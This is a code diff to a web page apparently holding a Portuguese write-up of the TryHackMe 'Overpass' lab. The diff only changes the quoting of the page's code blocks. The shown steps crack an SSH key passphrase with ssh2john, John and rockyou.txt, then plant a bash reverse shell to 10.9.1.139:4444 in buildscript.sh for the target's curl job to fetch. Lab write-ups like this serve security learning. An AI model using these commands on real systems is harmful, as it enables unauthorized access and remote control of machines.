@@ -129,7 +129,8 @@ Cookies.set("SessionToken","123");`}</CodeBlock>
                     <CodeBlock>chmod 600 id_rsa</CodeBlock>
                 </li>
                 <li><strong>Extrair o hash:</strong> O John não trabalha diretamente com a chave, mas com seu hash. O script <InlineCode>ssh2john.py</InlineCode> faz exatamente isso: converte a chave privada para um formato de hash que o John consegue entender.
-                    <CodeBlock>python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash</CodeBlock>
+                    {/* CORREÇÃO APLICADA AQUI */}
+                    <CodeBlock>{'python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash'}</CodeBlock>
                 </li>
                 <li><strong>Quebrar o hash:</strong> Com o hash em mãos, usei o John e a famosa wordlist <InlineCode>rockyou.txt</InlineCode> para testar milhões de senhas comuns em segundos.
                     <CodeBlock>john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</CodeBlock>
@@ -184,10 +185,8 @@ james@overpass-prod:~$ cat user.txt`}
 echo "10.9.1.139 overpass.thm" >> /etc/hosts`}</CodeBlock>
                 </li>
                 <li><strong>Preparar o Payload:</strong> Em nossa máquina de ataque, criamos a estrutura de diretórios que o <InlineCode>curl</InlineCode> espera (<InlineCode>/downloads/src/</InlineCode>). Dentro dela, criamos o arquivo <InlineCode>buildscript.sh</InlineCode> com um comando de reverse shell. Este comando abrirá uma conexão de volta para nossa máquina, nos dando um shell interativo.
-                    <CodeBlock>{`# Na máquina do atacante
-mkdir -p ~/downloads/src
-cd ~/downloads/src
-echo "bash -i >& /dev/tcp/10.9.1.139/4444 0>&1" > buildscript.sh`}</CodeBlock>
+                    {/* CORREÇÃO APLICADA AQUI */}
+                    <CodeBlock>{'# Na máquina do atacante\nmkdir -p ~/downloads/src\ncd ~/downloads/src\necho "bash -i >& /dev/tcp/10.9.1.139/4444 0>&1" > buildscript.sh'}</CodeBlock>
                 </li>
                 <li><strong>Servir o Payload e Iniciar o Listener:</strong> Iniciamos um servidor web simples em Python para hospedar nosso script malicioso e, em outro terminal, um listener com <InlineCode>netcat</InlineCode> (nc) para receber a conexão do reverse shell na porta 4444.
                     <CodeBlock>{`# Na máquina do atacante (no diretório ~/)
